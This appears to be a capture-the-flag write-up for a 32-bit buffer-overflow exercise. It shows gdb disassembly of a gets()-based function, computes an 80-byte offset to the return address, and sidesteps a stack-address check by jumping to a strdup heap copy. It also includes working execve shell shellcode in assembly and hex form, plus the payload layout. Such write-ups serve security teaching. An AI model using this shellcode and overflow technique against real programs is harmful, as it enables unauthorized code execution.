Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.

Nothing interesting here, the main function just calls the 'p' function.

Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.

Lets place a breakpoint before gets call to see the eax value (which will be the buffer address)

(gdb) break *0x080484ed
(gdb) run

(gdb) info register
eax            0xbffff6dc	-1073744164
ebp            0xbffff728	0xbffff728

(gdb) x/x 0xbffff6c0
0xbffff6c0:	0xbffff6dc

The buffer address is : 0xbffff6dc

returned value of the function (EIP) is stored in EBP+0x4 (0xbffff728 + 0x4 = 0xbffff72c)

(gdb) p/x 0xbffff72c - 0xbffff6dc
$4 = 0x50

(gdb) p/d 0x50
$5 = 80

We now know that if the buffer is filled with 80 bytes, after that, we will be writing in EIP.


0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>

These lines are a protection of EIP (written in [ebp+0x4])

if the first byte of the returned adress of EIP is not equal to b , we jump to <+83>, otherwise we printf and exit.

Since the adresses in the stack all start with the "b" byte, it means that we will not be able to write code to execute in the stack because we would then printf and exit instantly.

Lets look which functions we can exploit if we jump to <+83> :

(gdb) break *0x0804853d
(gdb) run
(gdb) info registers
eax            0x804a008	134520840

Now we know that the return value of the strdup function is equal to 0x804a008 and could be used in EIP as it doesnt stat with 'b'

interestingly , the buffer address stored in [ebp-0x4c] is passed as a parameter to strdup, meaning that the return value of strdup is a pointer to our buffer allocated on the heap.

Now we know that :

- We can write on EIP by writing 80 bytes in out buffer
- We can set the value of EIP to 0x804a008 and it will continue from here

So now what we have to do is to inject machine code into the buffer, so that it will be executed.

For that we will build a shelcode :

/* ASM */
xor  eax, eax     ; Clear eax
push eax          ; Push NULL
push 0x68732f6e   ; Push "hs/n"
push 0x69622f2f   ; Push "ib//"
mov  ebx, esp     ; Get pointer to string path
push eax          ; Push null pointer for argv array terminator
push ebx          ; Push pointer to string path for argv[0]
mov  ecx, esp     ; Get pointer to argv array
push eax          ; Push null pointer for envp array
mov  edx, esp     ; Get pointer to envp array
mov  al, 11       ; Load execve syscall number (11 / 0x0b) into al/eax
int  0x80         ; Execute kernel system call


ld -m elf_i386 shell.o -o shell /* to test the program */

nasm -f elf32 shell.asm -o shell.o

objdump -D shell.o shows :

00000000 <.text>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 6e 2f 73 68       	push   $0x68732f6e
   8:	68 2f 2f 62 69       	push   $0x69622f2f
   d:	89 e3                	mov    %esp,%ebx
   f:	50                   	push   %eax
  10:	53                   	push   %ebx
  11:	89 e1                	mov    %esp,%ecx
  13:	50                   	push   %eax
  14:	89 e2                	mov    %esp,%edx
  16:	b0 0b                	mov    $0xb,%al
  18:	cd 80                	int    $0x80

  from this we can the build the shellcode :

  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"

  get its size :
  python2 -c 's="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"; print len(s)' --> 26

  Now we can inject our code by creating our buffer like this :

  - our shellcode (26 bytes)
  - padding (54 bytes)
  - the return address of strdup (reversed because of little endian)